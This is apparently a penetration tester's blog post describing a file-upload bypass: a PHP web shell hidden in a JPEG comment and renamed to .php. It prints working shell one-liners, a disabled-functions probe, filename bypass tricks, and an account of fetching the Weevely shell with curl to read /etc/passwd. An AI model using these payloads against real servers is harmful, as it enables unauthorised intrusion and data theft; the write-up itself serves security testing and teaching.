---
layout: post
title: A Tale of a PHP Shell
tags: [pentest]
category: posts
---

During a penetration test where I had only a single day to get the most out of a web application, a photo upload feature caught my attention. By the time I got to the upload page, I already discovered that all the photos were uploaded to a specific directory for each authenticated user:

	http://example.com/attachments/[USERID]/
	
I knew where my uploaded files will be put, now it was time to get a shell up and working! I started with a very basic shell, which I usually employ as a starting point:

{% highlight php %}
<?php echo "<pre>"; system($_GET['cmd']); echo "</pre>"; ?>
{% endhighlight %}
	
First of all, I tried uploading a .php file directly, just to test my daily luck. Without much surprise, the application only accepted JPEG files.

Next, I tried adding the .jpg extension to my file, relying on the usual tricks as `shell.php.jpg`, `shell.jpg`, `shell.php%00.jpg` etc. None of them went through.

The only remaining solution seemed to insert the shell code into the JPEG comment, as the application apperared to accept only proper image files. It worked!

Jumping right into the newly uploaded shell, I quickly discover that the .jpg file wasn't being executed by the server, leaving me with a useless commented picture.

To test the security mechanisms further, I tried renaming the JPEG into .php and this time the upload completed successfully. The application was only checking for the file to be a proper JPEG, regardless of the extension!

Getting back to my shell, I am greeted by an error message stating that `system()` is disabled and couldn't be used to execute commands. My chances were getting thin as I figured most of the functions must have been disabled. In order to check which functions I could still use, I uploaded the following code:

{% highlight php %}
<?php echo "<pre>"; echo ini_get("disable_functions"); echo "</pre>"; ?>
{% endhighlight %}

Despite my basic knowledge of the PHP language, I immediately noticed that the returned list was not including the `exec()` function. The updated shell now looked like:

{% highlight php %}
<?php echo "<pre>"; exec($_GET['cmd']); echo "</pre>"; ?>
{% endhighlight %}

To my dismay, while not returning any error messages, the shell was returning only one-line responses (e.g. `whoami` worked, `ls` didn't). Utterly annoyed, I went back to the `exec()` guide and noticed that I got it all wrong! To properly address the output issue, the shell evolved into:

{% highlight php %}
<?php echo "<pre>"; exec($_GET['cmd'], $o, $r); print implode("\n", $o); echo "</pre>"; ?>
{% endhighlight %}

Once more, I inserted the code into a JPG comment and renamed it to shell.php. This time the uploaded shell was finally working properly! The shell could be used via the `cmd` parameter in order to execute commands directly onto the server.
	
	http://example.com/attachments/12345/shell.php?cmd=whoami

At this point, I was able to browse and operate on the whole web root, but *mod_security* was forbidding me more interesting actions, like executing `cat /etc/password`. Not completely satisfied with the result, I checked the available applications and noticed that `curl` was available...

Time was running out and I decided to try out [Weevely][weevely], an (amazing) interactive shell that can be controlled from the terminal. Using Dropbox and `curl` I was able to directly download Weevely on the remote server and the new shell was able to read /etc/passwd and return other interesting PHP configuration information, like the list of available functions.


[weevely]: https://github.com/epinna/Weevely